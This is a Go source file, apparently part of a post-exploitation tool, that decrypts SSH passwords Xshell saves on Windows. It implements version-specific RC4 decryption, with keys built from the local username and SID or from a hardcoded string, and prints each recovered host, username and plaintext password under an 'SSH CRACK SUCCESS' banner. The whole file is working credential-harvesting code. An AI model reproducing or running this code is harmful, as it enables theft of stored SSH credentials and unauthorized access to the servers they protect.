package ssh

import (
	"crypto/md5"
	"crypto/rc4"
	"crypto/sha256"
	"encoding/base64"
	"gorun/config"
	"regexp"

	"github.com/fatih/color"
)

type Xsh struct {
	Host      string
	localname string
	username  string
	password  string
	encryptpw string
	version   string
	SID       string
}

func str_reverse(str string) string {
	var data = make([]byte, len(str))
	for i := 0; i < len(str); i++ {
		data[i] = str[len(str)-i-1]
	}
	return string(data)
}
func Rc4(data, key []byte) string {
	c, err := rc4.NewCipher(key)
	config.Checkerror(err)
	c.XORKeyStream(data, data)
	return string(data)
}
func (xsh *Xsh) decryptV7() { //7.x版本之后的xshell解密算法
	str1 := str_reverse(xsh.localname) + xsh.SID
	str1 = str1[0 : len(str1)-1]
	str1 = str_reverse(str1)
	// fmt.Printf("len(str1): %v\n", len(str1))
	// fmt.Printf("str1: %v\n", str1)
	// return str1
	data, _ := base64.StdEncoding.DecodeString(xsh.encryptpw)
	// fmt.Printf("data: %v\n", data)
	h := sha256.New()
	h.Write([]byte(str1))
	key := h.Sum(nil)
	// fmt.Printf("key: %v\n", key)
	pass_data := data[:(len(data) - 32)]
	// fmt.Printf("pass_data: %v\n", pass_data)
	xsh.password = Rc4(pass_data, key)
	// fmt.Printf("xsh.password: %v\n", xsh.password)
}
func (xsh *Xsh) decryptV6() { //
	// fmt.Printf("xsh.username: %v\n", xsh.localname)
	data, _ := base64.StdEncoding.DecodeString(xsh.encryptpw)
	// fmt.Printf("len(xsh.SID): %v\n", len(xsh.SID))
	str := xsh.localname + xsh.SID
	str = str[0 : len(str)-1]
	// fmt.Printf("str: %v\n", str)
	h := sha256.New()
	h.Write([]byte(str))
	key := h.Sum(nil)
	// fmt.Printf("key: %v\n", key)
	pass_data := data[:(len(data) - 32)]
	xsh.password = Rc4(pass_data, key)
}
func (xsh *Xsh) decryptV5() { //5.1/5.2
	data, _ := base64.StdEncoding.DecodeString(xsh.encryptpw)
	str := xsh.SID[0 : len(xsh.SID)-1]
	h := sha256.New()
	h.Write([]byte(str))
	key := h.Sum(nil)
	pass_data := data[:(len(data) - 32)]
	xsh.password = Rc4(pass_data, key)
}
func (xsh *Xsh) decrypt_Other() { //5.0 4.x 3.x 2.x
	data, _ := base64.StdEncoding.DecodeString(xsh.encryptpw)
	string_to_hash := "!X@s#h$e%l^l&"
	h := md5.New()
	h.Write([]byte(string_to_hash))
	key := h.Sum(nil)
	pass_data := data[:(len(data) - 32)]
	xsh.password = Rc4(pass_data, key)
}
func (xsh *Xsh) regversion(patte string) bool {
	r := regexp.MustCompile(patte)
	b := r.Match([]byte(xsh.version))
	return b
}
func (xsh *Xsh) XshCrackPrint() {
	color.Green("================================SSH CRACK SUCCESS =============================")
	config.Loginfo_print(" Version: " + xsh.version)
	config.Loginfo_print("  Host  : " + xsh.Host)
	config.Loginfo_print("username: " + xsh.username)
	config.Loginfo_print(" passwd : " + xsh.password)
	// fmt.Printf("xsh.password: %v\n", xsh.password)
	color.Green("=======================================END=====================================\n\n")
	return
}
func (xsh *Xsh) SwitchRun() {
	// fmt.Printf("xsh.version: %v\n", xsh.version)
	b_other := xsh.regversion("5.0|4.[1-9]|3.[1-9]|2.[1-9]")
	b5 := xsh.regversion("5.1|5.2")
	b6 := xsh.regversion("5.[3-9]|6.[0-9]|7.0") //5.3-5.9|6.0-6.9|7.0
	// fmt.Printf("b6: %v\n", b6)
	b7 := xsh.regversion("7.[1-9]")
	// fmt.Printf("b: %v\n", b7)
	if b_other {
		xsh.decrypt_Other()
		xsh.XshCrackPrint()
	}
	if b5 {
		xsh.decryptV5()
		xsh.XshCrackPrint()
	}
	if b6 {
		xsh.decryptV6()
		xsh.XshCrackPrint()
	}
	if b7 {
		xsh.decryptV7()
		xsh.XshCrackPrint()
	}
}
func InitXSh(Xshmap map[string]string) {
	localname, SID := GetUserSid()
	xsh := Xsh{
		localname: localname,
		SID:       SID,
		Host:      Xshmap["ip"],
		username:  Xshmap["name"],
		encryptpw: Xshmap["encryptpw"],
		version:   Xshmap["version"],
	}
	xsh.SwitchRun()
}
